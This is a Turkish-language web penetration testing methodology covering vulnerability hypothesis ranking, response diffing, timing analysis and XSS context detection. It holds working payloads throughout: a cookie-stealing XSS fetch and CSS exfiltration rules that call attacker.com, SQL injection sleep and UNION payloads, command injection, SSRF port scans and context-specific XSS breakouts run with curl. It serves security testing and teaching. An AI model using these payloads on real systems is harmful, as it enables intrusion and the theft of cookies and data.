### KATMAN 5 — HİPOTEZ ÜRETİMİ (Hypothesis Generation)

Artık elinde bol miktarda gözlem var. Sıra bunları anlamlandırmakta. Her gözlem, bir hipoteze dönüşmelidir. Bu katmanın amacı: test edilecek saldırı vektörlerini önceliklendirilmiş bir liste halinde belirlemek.

#### 5.1 Hipotez Formatı

Her hipotez şu formatta yazılır:

```
[N] [ZAFİYET TÜRÜ] — [ÖNCELİK] — [Gözlem Kanıtı] → [Beklenen Davranış] → [Test Stratejisi]
```

Örnekler:

```
[1] Reflected XSS — KRİTİK — <script>alert(1)</script> ham olarak yansıyor, HTML encoding yok, CSP header yok
    → Tarayıcıda JavaScript çalıştırılabilir → <img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)> test et

[2] SQL Injection — KRİTİK — ' OR '1'='1 tüm kayıtları döndü, hata mesajı MySQL formatında
    → Veritabanı sorgusuna doğrudan müdahale edilebiliyor → UNION SELECT ile veri sızdırma dene

[3] SSRF — YÜKSEK — http://127.0.0.1:8080 5200ms yanıt süresi (baseline: 200ms)
    → Sunucu iç ağa istek yapabiliyor → Port taraması + AWS metadata endpoint dene

[4] Bilgi Sızdırma — ORTA — PHP Fatal error dosya yolunu (/var/www/search.php:12) gösteriyor
    → Sunucu dosya sistemi bilgisi sızdırılıyor → Path traversal ile diğer dosyaları okumayı dene

[5] DoS — DÜŞÜK — 100000 karakterlik girdide yanıt süresi lineer artıyor (9200ms)
    → Algoritma O(n) veya daha kötü → 1M karakterle kaynak tüketimi test et
```

#### 5.2 Önceliklendirme Kriterleri

Hipotezleri şu kritere göre sırala:

1. **KRİTİK:** Doğrulanmış davranış + doğrudan istismar edilebilir
   - SQL injection (veri sızıntısı zaten gözlemlendi)
   - Command injection (komut çalıştığına dair kanıt var)
   - Reflected XSS (ham yansıma + CSP yok)
   - Kimlik doğrulama bypass

2. **YÜKSEK:** Güçlü belirtiler var ama henüz doğrulanmadı
   - SSRF (zamanlama farkı var ama yanıt içeriği henüz görülmedi)
   - Stored XSS (yansıma görüldü ama kalıcılık test edilmedi)
   - IDOR (farklı ID'lerle farklı veriler dönüyor)
   - Dosya yükleme zaafiyeti

3. **ORTA:** Potansiyel var ama sınırlı etki veya engeller var
   - Bilgi sızdırma (stack trace'ler, hata mesajları)
   - Açık redirect (yönlendirme var ama filtre var)
   - CSRF (token yok ama özel koşullar gerekli)

4. **DÜŞÜK:** Teorik olarak mümkün ama pratik etkisi düşük
   - Clickjacking (X-Frame-Options yok ama kullanıcı etkileşimi gerekli)
   - Zayıf şifre politikası
   - Eksik güvenlik başlıkları (tek başına zaafiyet değil)

5. **TEST ETME:** Atla (false positive veya test edilemez)
   - WAF tarafından tamamen engellenen vektörler
   - Erişimin olmayan fonksiyonlar
   - Üretim ortamında test edilemeyecek yıkıcı payload'lar

#### 5.3 Hipotez Ağacı Oluşturma

Her hipotez, alt hipotezlere dallanabilir. Örneğin:

```
SQL Injection ana hipotezi:
├── Error-based SQLi → MySQL hata mesajları dönüyor
│   ├── extractvalue() ile veri sızdırma
│   └── updatexml() ile veri sızdırma
├── UNION-based SQLi → ' OR 1=1 tüm kayıtları döndü
│   ├── Sütun sayısını bul (ORDER BY tekniği)
│   └── Bilgi şemasından tablo isimlerini oku
├── Boolean-based Blind SQLi → Farklı koşullarda farklı yanıt boyutları
│   └── SUBSTRING ile karakter karakter veri oku
└── Time-based Blind SQLi → SLEEP(5) ile gecikme doğrulandı
    └── IF() + SLEEP() ile veri sızdır
```

#### 5.4 Yanlış Pozitifleri Eleme

Bazı gözlemler yanıltıcı olabilir. Hipotez üretirken şunları göz önünde bulundur:

- **Yanıt süresi artışı:** Ağ gecikmesi, sunucu yükü, cache durumu olabilir. Her testi 3 kez tekrarla.
- **Yanıt boyutu değişimi:** Dinamik içerik (reklam, öneriler, zaman damgası) boyutu etkileyebilir.
- **Hata mesajları:** Bazı framework'ler üretim modunda bile stack trace gösterebilir.
- **WAF blokları:** 403, bir zaafiyetin var olduğu anlamına gelmez; sadece WAF'ın bir pattern'i tetiklediği anlamına gelir.

#### 5.5 Belgeleme Formatı (Katman 5)

```
## Katman 5 — Hipotez Üretimi

### Hipotez Listesi (Öncelik Sıralı)

[1] SQL Injection (Error-based) — KRİTİK
    Kanıt: ' tek tırnak → MySQL syntax error: "near ''' at line 1"
    Kanıt: ' OR '1'='1 → Tüm kayıtlar dönüyor (45000 byte vs baseline 3421 byte)
    Kanıt: ' OR SLEEP(5)='1 → Yanıt süresi 5087ms (baseline 87ms)
    Strateji: UNION SELECT ile veritabanı yapısını keşfet → bilgi şeması → hassas tablolar

[2] Reflected XSS — KRİTİK
    Kanıt: <script>alert(1)</script> ham olarak yansıyor (<div> içinde, encoding yok)
    Kanıt: " onmouseover="alert(1) → Attribute bağlamında da yansıyor
    Kanıt: CSP header yok, X-XSS-Protection yok
    Strateji: HTML bağlamı için <img src=x onerror=...>, Attribute bağlamı için " autofocus onfocus=... test et

[3] Bilgi Sızdırma — ORTA
    Kanıt: PHP Fatal error → /var/www/search.php:12 tam dosya yolu
    Kanıt: X-Powered-By: PHP/8.2.7 → Versiyon bilgisi
    Kanıt: X-Debug-Token: a3f9c2 → Debug modu açık olabilir (Symfony profiler?)
    Strateji: Path traversal ile .env, config.php gibi dosyaları okumayı dene

[4] SSRF — YÜKSEK
    Kanıt: http://127.0.0.1:8080 → 5200ms yanıt süresi (port 8080'e TCP bağlantısı kuruldu)
    Kanıt: http://127.0.0.1:80 → 45ms (port kapalı, hemen ret)
    Strateji: İç ağ port taraması yap, AWS/cloud metadata endpoint'lerini dene

[5] DoS — DÜŞÜK
    Kanıt: 100K karakter → 9200ms, 10K karakter → 920ms (lineer artış)
    Strateji: 1M karakter ile etkiyi doğrula (dikkatli ol, servisi düşürme)

### Test Planı
- İlk test: [1] SQL Injection (en yüksek etki, en net kanıt)
- İkinci test: [2] Reflected XSS (hızlı doğrulanabilir)
- Üçüncü test: [4] SSRF (ilginç bulgu, keşfedilmeyi bekliyor)
- Atla: [5] DoS (üretim ortamında riskli, önce izin al)
```

---

## BÖLÜM 2: YANIT KARŞILAŞTIRMA PROTOKOLÜ (Response Diffing Protocol)

İki yanıtı bilimsel olarak karşılaştırmak, güvenlik testinin en kritik becerilerinden biridir. Gözle görülür farklar kadar, ince farklar da önemlidir. Bu protokol, yanıtları sistematik olarak karşılaştırmayı öğretir.

### 2.1 Baseline ve Test Yanıtı

Her karşılaştırma için iki yanıta ihtiyacın var:

- **Baseline (Referans):** Normal, zararsız değerle alınan yanıt
- **Test (Deney):** Test payload'ı ile alınan yanıt

### 2.2 Karşılaştırma Kategorileri

#### A. HTTP Durum Kodu Karşılaştırması

```
Baseline: 200
Test:     500 → Sunucu hatası. Payload sunucuyu çökertti. KRİTİK bulgu.
Test:     403 → WAF/IPS tetiklendi. Payload güvenlik duvarınca engellendi.
Test:     302 → Yönlendirme. Hedef URL'i kontrol et. Açık yönlendirme olabilir.
Test:     400 → Doğrulama hatası. Framework doğrulaması tetiklendi.
Test:     404 → Sayfa bulunamadı. Routing değişti veya hata sayfasına düşüldü.
Test:     429 → Rate limiting tetiklendi. Çok hızlı istek attın.
Test:     200 → Aynı. Bu iyi de olabilir (payload işlendi), kötü de (gözle görülür fark yok).
```

#### B. Yanıt Süresi Karşılaştırması

```
Baseline: 87ms
Test:     5087ms (delta: +5000ms) → SLEEP(5) çalıştı. Time-based injection doğrulandı.
Test:     234ms  (delta: +147ms)  → Küçük artış. Ağ gecikmesi olabilir. Testi 3 kez tekrarla.
Test:     12ms   (delta: -75ms)   → Hızlı yanıt. Cache'den dönmüş olabilir veya hata nedeniyle erken çıkış.
Test:     5023ms (delta: +4936ms) → DNS çözümlemesi veya dış bağlantı bekleniyor. SSRF göstergesi.
```

#### C. Yanıt Boyutu Karşılaştırması

```
Baseline: 3421 byte
Test:     45000 byte (delta: +41579, %1216 artış) → Çok daha fazla veri dönüyor. SQLi'de tüm kayıtlar.
Test:     3421 byte (delta: 0) → Aynı boyut. Payload yanıt yapısını değiştirmedi (veya hata sessizce yutuldu).
Test:     1200 byte (delta: -2221, %65 azalış) → Daha az veri. Hata sayfası dönüyor olabilir veya filtre çalıştı.
Test:     3425 byte (delta: +4) → Küçük değişiklik. Payload'ın kendisi yanıta eklendi. Yansıma var.
```

**Önemli:** %10'dan fazla boyut farkı → farklı kod yolu çalıştırıldı demektir. Araştır.

#### D. Yanıt Başlıkları Karşılaştırması

```
Farklı başlıkları tespit et:
- Yeni Set-Cookie → Session manipülasyonu mümkün olabilir
- Farklı Content-Type → Tip karışıklığı (type confusion)
- Yeni Location → Yönlendirme değişti
- X-Debug-* başlıkları → Debug modu tetiklendi
- Farklı Content-Length → Boyut değişikliğinin kaynağı
- Eksik başlıklar → Güvenlik başlıkları kaldırıldı mı?
```

#### E. Yanıt Gövdesi Yapısal Karşılaştırması

Yanıt gövdelerini diff'le. Sadece payload'ın göründüğü yeri değil, tüm yapıyı karşılaştır:

```
- HTML yapısı değişti mi? (yeni div'ler, eksik elementler)
- JSON yapısı değişti mi? (yeni alanlar, eksik alanlar, farklı tipler)
- Hata mesajları eklendi mi?
- Navigasyon/menü değişti mi? (farklı kullanıcı rolüne geçiş göstergesi)
- Footer/header değişti mi?
- Gizli input'lar değişti mi? (anti-CSRF token yenilendi mi?)
```

### 2.3 Karşılaştırma Araçları ve Teknikleri

**Yanıtları kaydetme:**
```bash
# Baseline
curl -s -o /tmp/baseline_body.txt -D /tmp/baseline_headers.txt \
  -w "%{http_code} %{time_total} %{size_download}" \
  "https://target.com/search?q=test123"

# Test
curl -s -o /tmp/test_body.txt -D /tmp/test_headers.txt \
  -w "%{http_code} %{time_total} %{size_download}" \
  "https://target.com/search?q=<script>alert(1)</script>"
```

**Diff araçları:**
```bash
# Başlıkları karşılaştır
diff /tmp/baseline_headers.txt /tmp/test_headers.txt

# Gövdeleri karşılaştır
diff /tmp/baseline_body.txt /tmp/test_body.txt

# Unified diff
diff -u /tmp/baseline_body.txt /tmp/test_body.txt

# Sadece eklenen/silinen satırları yan yana göster
diff -y /tmp/baseline_body.txt /tmp/test_body.txt

# Renkli diff (colordiff kuruluysa)
colordiff -u /tmp/baseline_body.txt /tmp/test_body.txt

# JSON yanıtları için yapısal karşılaştırma
jq -S . /tmp/baseline_body.txt > /tmp/baseline_sorted.json
jq -S . /tmp/test_body.txt > /tmp/test_sorted.json
diff -u /tmp/baseline_sorted.json /tmp/test_sorted.json
```

### 2.4 Tekrarlanabilirlik Kontrolü

Ağ dalgalanmalarının seni yanıltmaması için her testi 3 kez tekrarla:

```bash
for i in 1 2 3; do
  echo "=== Test $i ==="
  curl -s -o /dev/null -w "Status: %{http_code}, Time: %{time_total}s, Size: %{size_download}\n" \
    "https://target.com/search?q=test123"
  sleep 1
done
```

Eğer 3 test arasında %20'den fazla sapma varsa, ağ koşulları değişkendir. Bu durumda 5-10 tekrar yap ve ortalamayı al.

### 2.5 Karşılaştırma Tablosu Formatı

```
## Yanıt Karşılaştırması: [Payload Açıklaması]

| Metrik | Baseline (test123) | Test (<script>) | Delta | Yorum |
|--------|-------------------|-----------------|-------|-------|
| Durum Kodu | 200 | 200 | 0 | Her ikisi de 200 döndü |
| Süre (ms) | 87 | 92 | +5ms | Anlamlı fark yok |
| Boyut (byte) | 3421 | 3567 | +146 byte | Payload yanıta eklendi |
| Content-Type | text/html | text/html | Aynı | HTML dönüyor |
| Set-Cookie | yok | yok | Aynı | Oturum değişmedi |
| CSP Header | yok | yok | Aynı | CSP koruması YOK |
| Payload Konumu | <div>test123</div> | <div><script>alert(1)</script></div> | Ham yansıyor | HTML encoding YOK → XSS |

### Diff Özeti
- Eklenen: 146 byte (<script>alert(1)</script> string'i)
- Silinen: 0 byte
- Değişen: <div> içeriği (beklenen)
- Yapısal değişiklik: YOK — sayfa yapısı aynı, sadece aranan değer bölümü değişti

### Sonuç
Payload yanıtta ham olarak görünüyor, HTML entity encoding uygulanmamış.
Reflected XSS için uygun koşullar mevcut.
```

---

## BÖLÜM 3: ZAMANLAMA ANALİZ PROTOKOLÜ (Timing Analysis Protocol)

Zamanlama, backend'in sana söylemediği şeyleri anlatır. Bir yanıtın içeriği aynı görünse bile, süresi değişiyorsa, arkada farklı bir şeyler oluyor demektir. Bu protokol, zamanlama farklarını bilimsel olarak analiz etmeyi öğretir.

### 3.1 Zamanlama Metrikleri

curl'ün sağladığı her zamanlama metriğinin anlamı:

```
time_namelookup:    DNS çözümleme süresi. Uzunsa DNS sorunu var.
time_connect:       TCP bağlantı kurma süresi (SYN, SYN-ACK, ACK). Port kapalıysa hemen ret, açıksa 3-way handshake.
time_appconnect:    TLS/SSL handshake süresi. Sadece HTTPS'te anlamlı.
time_pretransfer:   Bağlantı kurulduktan sonra isteği göndermeye hazır olma süresi.
time_redirect:      Yönlendirme işleme süresi (toplam).
time_starttransfer: İlk byte'ın gelme süresi (TTFB - Time To First Byte). Backend işleme süresini gösterir.
time_total:         Toplam süre. En önemli metrik.
```

### 3.2 Baseline Oluşturma

Herhangi bir zamanlama testine başlamadan önce mutlaka baseline oluştur:

```bash
# 5 normal isteğin ortalamasını al
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{time_total}\n" "https://target.com/search?q=test"
done | awk '{sum+=$1; count++} END {print "Baseline ortalama:", sum/count*1000, "ms"}'
```

Bu baseline'ı belgele:
```
Baseline (5 isteğin ortalaması):
- time_total: 87ms (min: 82ms, max: 94ms, stddev: 5ms)
- time_starttransfer: 78ms (TTFB)
- time_connect: 12ms
```

### 3.3 Zamanlama Testleri ve Yorumlama

#### SQL Injection — Time-based

```bash
# MySQL SLEEP()
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  "https://target.com/user?id=1' AND SLEEP(5)='1"

# PostgreSQL pg_sleep()
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  "https://target.com/user?id=1' OR pg_sleep(5)='1"

# MSSQL WAITFOR DELAY
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  "https://target.com/user?id=1'; WAITFOR DELAY '00:00:05'--"
```

Sonuç analizi:
```
Baseline: 87ms
SLEEP(5): 5087ms → Delta: 5000ms → Time-based SQLi DOĞRULANDI
```

**Uyarı:** SLEEP(5) bazen tam olarak 5 saniye geciktirmez. 4.8-5.2 saniye arası normaldir. Ama 2-3 saniye fark beklenmez. 500ms artış SQLi değildir; normal varyanstır.

#### Command Injection — Time-based

```bash
# Linux
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  "https://target.com/ping?host=127.0.0.1; sleep 5"

# Windows
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  "https://target.com/ping?host=127.0.0.1& timeout 5"
```

#### SSRF — Time-based

```bash
# Port tarama (açık portta zamanlama farklıdır)
# Port 80 (kapalı olabilir)
curl -s -o /dev/null -w "Port 80: %{time_total}s\n" \
  "https://target.com/fetch?url=http://127.0.0.1:80"

# Port 8080 (açık olabilir)
curl -s -o /dev/null -w "Port 8080: %{time_total}s\n" \
  "https://target.com/fetch?url=http://127.0.0.1:8080"

# Var olmayan host (DNS timeout)
curl -s -o /dev/null -w "Invalid: %{time_total}s\n" \
  "https://target.com/fetch?url=http://doesnotexist.internal:80"
```

Sonuç analizi:
```
Port 80:    45ms  → TCP bağlantısı hemen reddedildi (port kapalı)
Port 8080:  234ms → TCP bağlantısı kuruldu (port açık) + veri alışverişi
Invalid:    5234ms → DNS çözümleme timeout'u (host yok)
Baseline:   87ms  → Normal istek süresi
```

#### Algoritmik Karmaşıklık — Time-based

```bash
# Girdi boyutu ile süre arasındaki ilişkiyi ölç
for size in 10 100 1000 10000; do
  payload=$(python3 -c "print('A'*$size)")
  time=$(curl -s -o /dev/null -w "%{time_total}" "https://target.com/search?q=$payload")
  echo "$size chars → ${time}s"
done
```

Sonuç analizi:
```
10:    0.087s  (baseline)
100:   0.089s  (normal)
1000:  0.142s  (hafif artış)
10000: 0.892s  (lineer artış, O(n))
100000: 9.234s (lineer devam ediyor → regex ReDoS potansiyeli yok, ama DoS mümkün)
```

Eğer süreler şöyle olsaydı:
```
10:    0.087s
100:   0.092s
1000:  0.450s  ← başlıyor
10000: 45.23s  ← PATLAMA! O(n²) veya daha kötü → ReDoS/algorithmic complexity
```

Bu, regex ReDoS (Regular Expression Denial of Service) için klasik bir göstergedir.

### 3.4 Yanlış Pozitifleri Eleme

Zamanlama farkları her zaman zaafiyet göstergesi değildir:

| Gözlem | Olası Yanlış Pozitif | Doğrulama Yöntemi |
|--------|---------------------|-------------------|
| 500ms artış | Ağ gecikmesi, sunucu yükü | 5 kez tekrarla, tutarlı mı? |
| 2s artış | Cache miss, cold start | Aynı isteği hemen tekrarla, süre düşüyor mu? |
| Rastgele süreler | Rate limiting, load balancer | Farklı IP'den veya bekleyerek tekrar dene |
| İlk istek yavaş | DNS cache, connection pool | İlk isteği baseline'a dahil etme |
| Sürekli artan süreler | Memory leak, resource exhaustion | Uzun süreli test yap, limite ulaşıyor mu? |

### 3.5 Zamanlama Analiz Tablosu Formatı

```
## Zamanlama Analizi: [Test Açıklaması]

### Baseline (5 tekrar)
| # | Toplam Süre | TTFB | Connect |
|---|------------|------|---------|
| 1 | 87ms | 78ms | 12ms |
| 2 | 82ms | 74ms | 11ms |
| 3 | 94ms | 85ms | 13ms |
| 4 | 85ms | 76ms | 12ms |
| 5 | 88ms | 79ms | 12ms |
| **Ort** | **87.2ms** | **78.4ms** | **12.0ms** |
| **StdDev** | **4.0ms** | **3.8ms** | **0.6ms** |

### Test: SLEEP(5) Payload (3 tekrar)
| # | Toplam Süre | TTFB | Connect | Delta (Toplam) |
|---|------------|------|---------|----------------|
| 1 | 5092ms | 5082ms | 11ms | +5005ms |
| 2 | 5080ms | 5071ms | 12ms | +4993ms |
| 3 | 5088ms | 5079ms | 10ms | +5001ms |
| **Ort** | **5086.7ms** | **5077.3ms** | **11.0ms** | **+4999.5ms** |

### Sonuç
- TTFB artışı: +4998.9ms (toplam süre artışının %99.99'u)
- Connect süresi: Değişmedi (bağlantı normal)
- Delta: 5000ms ± 6ms → SLEEP(5) KESİN OLARAK çalıştı
- Time-based SQL Injection DOĞRULANDI.
```

---

## BÖLÜM 4: BAĞLAM TESPİT PROTOKOLÜ (Context Detection Protocol)

XSS gibi enjeksiyon zaafiyetlerinde, payload'un yanıtta nerede ve nasıl göründüğünü anlamak, başarılı bir exploit için KRİTİK öneme sahiptir. HTML encoding olsa bile, yanlış bağlamda encoding işe yaramaz. Bu protokol, yansıma bağlamını kesin olarak tespit etmeyi öğretir.

### 4.1 HTML Bağlamı (HTML Context)

Payload'un HTML elementi içeriği olarak yansıdığı durum:

```html
<div>KULLANICI_GIRDİSİ_BURADA</div>
<span>Sonuç: KULLANICI_GIRDİSİ_BURADA</span>
<p>KULLANICI_GIRDİSİ_BURADA</p>
<td>KULLANICI_GIRDİSİ_BURADA</td>
<li>KULLANICI_GIRDİSİ_BURADA</li>
<h1>KULLANICI_GIRDİSİ_BURADA</h1>
<textarea>KULLANICI_GIRDİSİ_BURADA</textarea>
<title>KULLANICI_GIRDİSİ_BURADA</title>
```

**Bu bağlamda çalışan payload'lar:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

**Özel durum — `<textarea>` veya `<title>` içinde:**
Bu elementlerde HTML etiketleri render edilmez, düz metin olarak gösterilir. Önce parent elementi kapatman gerekir:
```html
</textarea><script>alert(1)</script><textarea>
</title><script>alert(1)</script><title>
```

### 4.2 Attribute Bağlamı (Attribute Context)

Payload'un HTML attribute değeri olarak yansıdığı durum:

```html
<input type="text" value="KULLANICI_GIRDİSİ_BURADA">
<a href="KULLANICI_GIRDİSİ_BURADA">link</a>
<img src="KULLANICI_GIRDİSİ_BURADA">
<div class="KULLANICI_GIRDİSİ_BURADA">
<iframe src="KULLANICI_GIRDİSİ_BURADA">
<meta name="keywords" content="KULLANICI_GIRDİSİ_BURADA">
```

**Tırnak işareti kullanımına göre:**

**Çift tırnak (`"`) ile çevrili:**
```html
<input value="BURADA">
```
Payload: `" onmouseover="alert(1)` veya `" autofocus onfocus="alert(1)`

**Tek tırnak (`'`) ile çevrili:**
```html
<input value='BURADA'>
```
Payload: `' onmouseover='alert(1)` veya `' autofocus onfocus='alert(1)`

**Tırnak işareti YOK:**
```html
<input value=BURADA>
```
Payload: `x onclick=alert(1)` (boşluk attribute'u sonlandırır)

**Özel attribute'lar — `href`:**
```html
<a href="BURADA">link</a>
```
Payload: `javascript:alert(1)` (direkt JavaScript protokolü)

**Özel attribute'lar — `src`:**
```html
<img src="BURADA">
```
Payload: `x" onerror="alert(1)` (önce src'yi kapat, sonra event handler ekle)

**Özel attribute'lar — `onclick`, `onmouseover` gibi event handler'lar:**
```html
<div onclick="doSomething('BURADA')">
```
Bu JavaScript bağlamıdır! Attribute bağlamından çıkmış olursun, JavaScript enjeksiyonu gerekir:
Payload: `'); alert(1); //`

### 4.3 JavaScript Bağlamı (JavaScript Context)

Payload'un `<script>` etiketi içinde veya event handler içinde yansıdığı durum:

```html
<script>
  var query = "KULLANICI_GIRDİSİ_BURADA";
</script>

<script>
  var data = KULLANICI_GIRDİSİ_BURADA;
</script>

<div onclick="process('KULLANICI_GIRDİSİ_BURADA')">
```

**String içinde (tırnakla çevrili):**
```javascript
var query = "BURADA";
```
Payload: `"; alert(1); //` (çift tırnak için) veya `'; alert(1); //` (tek tırnak için)

**Değişken değeri olarak (tırnaksız):**
```javascript
var data = BURADA;
```
Payload: `1; alert(1); var x = 1`

**JSON içinde:**
```javascript
var config = {"query": "BURADA"};
```
Payload: `"}, "evil": alert(1), "x": {"` (JSON yapısını bozup yeniden inşa et)

**Template literal içinde (backtick):**
```javascript
var msg = `BURADA`;
```
Payload: `${alert(1)}`

### 4.4 CSS Bağlamı (CSS Context)

Payload'un `<style>` etiketi içinde veya `style` attribute'unda yansıdığı durum:

```html
<style>
  body { color: BURADA; }
</style>

<div style="color: BURADA;">
```

CSS bağlamında XSS (CSS Injection → IE'nin `expression()` veya modern `-moz-binding` ile):
```css
body { color: expression(alert(1)); }  /* IE only */
```

Ancak CSS injection'ın asıl tehlikesi veri sızdırmadır (CSS-based exfiltration):
```css
input[value^="a"] { background: url("https://attacker.com/?char=a"); }
input[value^="b"] { background: url("https://attacker.com/?char=b"); }
/* ... tüm karakterler için ... */
```

### 4.5 URL Bağlamı (URL Context)

Payload'un URL içinde yansıdığı durum:

```
Path: https://target.com/search/KULLANICI_GIRDİSİ_BURADA
Query: https://target.com/search?q=KULLANICI_GIRDİSİ_BURADA
Hash: https://target.com/page#KULLANICI_GIRDİSİ_BURADA
```

URL bağlamında XSS için JavaScript protokolü:
```
javascript:alert(1)
```

Ancak modern tarayıcılar `javascript:` URL'lerini navigasyonda engeller. Bunun yerine açık yönlendirme (open redirect) ara:
```
//evil.com
https://evil.com
/\evil.com
```

### 4.6 JSON Bağlamı (JSON Context)

API yanıtında payload'un JSON değeri olarak yansıdığı durum:

```json
{"query": "BURADA", "results": []}
```

JSON'da HTML encoding işe yaramaz çünkü JSON HTML değildir. Ama JSON'da string escaping vardır:
```json
{"query": "<script>alert(1)<\/script>"}  // slash escape edilmiş
```

JSON bağlamında XSS genelde DOM-based olur (istemci tarafında JSON parse edilip DOM'a yazılırsa).

### 4.7 Bağlam Tespit Prosedürü

1. **Zararsız değer gönder:** `TESTCONTEXT123`
2. **Yanıtta değeri bul:** `grep` veya manuel arama ile
3. **Değerin etrafındaki 100 karakteri kopyala:**
   ```
   ...[önceki metin]TESTCONTEXT123[sonraki metin]...
   ```
4. **Bağlamı sınıflandır:**

```
Eğer TESTCONTEXT123 şunun içindeyse:
  <div>...</div>, <span>...</span>, <p>...</p> → HTML bağlamı
  <input value="...">, <a href="..."> → Attribute bağlamı (tırnak tipini not et)
  <script>...</script> → JavaScript bağlamı
  onclick="...", onmouseover="..." → JavaScript bağlamı (event handler)
  <style>...</style>, style="..." → CSS bağlamı
  https://target.com/... → URL bağlamı
  {"key": "..."} → JSON bağlamı
```

5. **Kesin konumu belgele:**
```
Yansıma bağlamı: Attribute bağlamı — çift tırnak içinde
Tam konum: <input type="hidden" name="token" value="TESTCONTEXT123">
Sınırlayıcı: " (çift tırnak)
Kapatılabilir: Evet — "> ile elementi kapatıp yeni HTML enjekte edilebilir
```

### 4.8 Bağlam Tespit Tablosu Formatı

```
## Bağlam Tespiti: [Endpoint/Input]

### Yansıma Konumu
Değer: TESTCONTEXT123
Bulunan konum sayısı: 2

#### Konum 1 (Birincil)
HTML:
  <div class="search-results">
    <p>Arama sonucu: <strong>TESTCONTEXT123</strong></p>
  </div>
Bağlam: HTML bağlamı — <strong> elementi içeriği
Encoding: HTML entity encoding YOK (ham yansıyor)
Etraf: Önce: "Arama sonucu: <strong>", Sonra: "</strong></p>"

#### Konum 2 (İkincil)
HTML:
  <script>
    window.__INITIAL_STATE__ = {"lastSearch": "TESTCONTEXT123"};
  </script>
Bağlam: JavaScript bağlamı — JSON string değeri içinde
Encoding: JSON escape var (tırnaklar kaçış karakterli olur)
Etraf: Önce: '"lastSearch": "', Sonra: '"}'

### XSS Stratejisi
Konum 1 (HTML bağlamı): <img src=x onerror=alert(1)> — en kolay
Konum 2 (JavaScript bağlamı): "}; alert(1); // — JSON yapısını kır
```

---

## BÖLÜM 5: GÖZLEM GÜNLÜĞÜ ŞABLONU

Her girdi için aşağıdaki formatı kullan. Bu format, tüm gözlemlerini tek bir yerde toplar ve hipotez üretimini kolaylaştırır.

```
================================================================================
## [GÖZLEM] [Endpoint veya Girdi Adı] — [Tarih/Saat]
================================================================================

### Katman 1 — Yapısal Gözlem
- Girdi adı: [name attribute değeri]
- HTML tipi: [type attribute değeri]
- ID: [varsa]
- Label/Placeholder: [varsa]
- Form action: [action URL]
- Form method: [GET/POST]
- Doğrulama attribute'ları: [required, pattern, min, max, maxlength, vs.]
- Olay işleyiciler: [onchange, oninput, onblur, onkeyup, vs.]
- Görünürlük: [görünür/gizli/koşullu/disabled/readonly]
- DOM konumu: [üst öğe, kardeşler, formdaki sıra]
- Notlar: [özel durumlar, şüpheli şeyler]

### Katman 2 — Zararsız Değer Gözlemi
- Gönderilen değer: [zararsız değer]
- HTTP Durum: [200/302/400/500]
- Yanıt süresi (time_total): [ms]
- Yanıt boyutu (size_download): [byte]
- Content-Type: [MIME tipi]
- Sunucu başlıkları: [Server, X-Powered-By, vs.]
- Değer yanıtta nerede: [tam konum, etrafındaki HTML/JSON]
- Kodlama: [ham / HTML entity / URL encoded / JSON / Base64]
- Takip istekleri: [varsa]
- Notlar: [önemli gözlemler]

### Katman 3 — Uç Değer Gözlemi
- [Uç değer]: → [Durum], [Süre], Yanıt: [özet]
- [Uç değer]: → [Durum], [Süre], Yanıt: [özet]
- ... (her uç değer için tek satır)

### Katman 4 — Tip İhlali Gözlemi
- [Tip ihlali]: → [Durum], Hata: [tam hata mesajı veya özet]
- [Tip ihlali]: → [Durum], Hata: [tam hata mesajı veya özet]
- Teknoloji tespiti: [Dil: ..., Framework: ..., DB: ..., Sunucu: ...]
- Doğrulama yaklaşımı: [client-only / server-side custom / framework default / none]

### Katman 5 — Hipotezler
1. [ZAFİYET TÜRÜ] — [KRİTİK/YÜKSEK/ORTA/DÜŞÜK] — [Kanıt özeti]
2. [ZAFİYET TÜRÜ] — [KRİTİK/YÜKSEK/ORTA/DÜŞÜK] — [Kanıt özeti]
3. ...

### Test Planı
- Öncelikli testler: [sıralı liste]
- Atla: [atlanacak testler ve nedenleri]

================================================================================
```

---

## BÖLÜM 6: KAÇINILMASI GEREKEN ANTİ-PATERNLER

### 6.1 Erken Yargı (Premature Judgment)

❌ **Yanlış:** Girdinin adı `url` → "Bu kesin SSRF'dir, hemen `http://169.254.169.254/latest/meta-data/` deneyeyim."

✅ **Doğru:** Girdinin adı `url` → Önce Katman 1-4'ü uygula. URL'nin gerçekten fetch edilip edilmediğini GÖZLEMLE. `http://127.0.0.1:80` ile istek at, yanıt süresini ölç. Süre değişiyorsa ve yanıt içeriği geliyorsa, EVET SSRF var. Ama önce GÖZLEMLE.

### 6.2 Bağlamsız Test (Context-Free Testing)

❌ **Yanlış:** Her girdiye `<script>alert(1)</script>` göndermek, sonra "XSS yok" demek.

✅ **Doğru:** Önce bağlamı tespit et. Girdi `<a href="...">` içinde yansıyorsa, `<script>` çalışmaz. Ama `javascript:alert(1)` çalışabilir. Girdi JSON yanıtındaysa, HTML etiketleri işe yaramaz ama JSON escape bypass'ı işe yarayabilir. BAĞLAMI ANLA.

### 6.3 Veritabanı Varsayımı (Database Assumption)

❌ **Yanlış:** "Bu bir web uygulaması, kesin SQL kullanıyordur. `' OR '1'='1` göndereyim."

✅ **Doğru:** Önce tip ihlali testi yap. Hata mesajlarından veritabanı türünü tespit ET. MySQL için `' OR SLEEP(5)='1`, PostgreSQL için `' OR pg_sleep(5)='1`, MSSQL için `'; WAITFOR DELAY '00:00:05'--` gibi VERİTABANINA ÖZEL payload'lar kullan. Hata mesajı yoksa, time-based yaklaşımla KÖR KÖRÜNE test et.

### 6.4 Header'lara Körü Körüne İnanma (Trusting Headers Blindly)

❌ **Yanlış:** `Server: Microsoft-IIS/10.0` → "Bu IIS, sadece IIS'e özgü zaafiyetleri test edeyim."

✅ **Doğru:** Header'lar yanıltıcı olabilir. Load balancer arkasında farklı bir sunucu olabilir. WAF header'ları değiştirebilir. Header'ı bir İPUCU olarak al, ama davranışsal testlerle DOĞRULA. IIS header'ına rağmen PHP hataları alıyorsan, IIS arkasında PHP çalışıyor demektir.

### 6.5 Gözlemsiz Test (Testing Without Observation)

